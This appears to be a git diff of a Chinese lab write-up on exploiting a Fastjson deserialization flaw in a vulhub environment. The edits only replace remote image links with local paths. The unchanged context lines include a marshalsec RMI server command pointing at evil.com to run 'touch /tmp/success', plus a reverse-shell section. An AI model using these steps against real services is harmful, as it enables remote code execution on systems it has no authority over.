@@ -19,7 +19,7 @@ docker-compose up -d
 
 环境运行后，访问`http://your-ip:8090`即可看到JSON格式的输出。
 
-![image-20220223111249998](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231112044.png)
+![image-20220223111249998](./images/202202231112044.png)
 
 我们向这个地址POST一个JSON对象，即可更新服务端的信息：
 
@@ -35,11 +35,11 @@ curl http://your-ip:8090/ -H "Content-Type: application/json" --data '{"name":"h
 
 正常数据响应时间（29毫秒）：
 
-![image-20220223141118979](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231411062.png)
+![image-20220223141118979](./images/202202231411062.png)
 
 存在Fastjson时，16进制数据响应时间明显变长（396毫秒）：
 
-![image-20220223140820884](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231408972.png)
+![image-20220223140820884](./images/202202231408972.png)
 
 **方式2 DNSlog**
 
@@ -95,7 +95,7 @@ $ cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar /home/kali/vulnerability/vulhub/
 $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com:8888/#TouchFile" 9999
 ```
 
-![image-20220223122416137](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231224191.png)
+![image-20220223122416137](./images/202202231224191.png)
 
 向靶场服务器发送Payload，带上RMI的地址，注意Content-Type应该是`application/json`：
 
@@ -119,11 +119,11 @@ Content-Length: 160
 }
 ```
 
-![image-20220223122432463](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231224531.png)
+![image-20220223122432463](./images/202202231224531.png)
 
 可见，命令`touch /tmp/success`已成功执行：
 
-![image-20220223122451321](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231224373.png)
+![image-20220223122451321](./images/202202231224373.png)
 
 ### 反弹shell
 
@@ -184,4 +184,4 @@ Content-Length: 165
 
 监听9999端口，接收反弹shell：
 
-![image-20220223125747062](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231257183.png)
+![image-20220223125747062](./images/202202231257183.png)
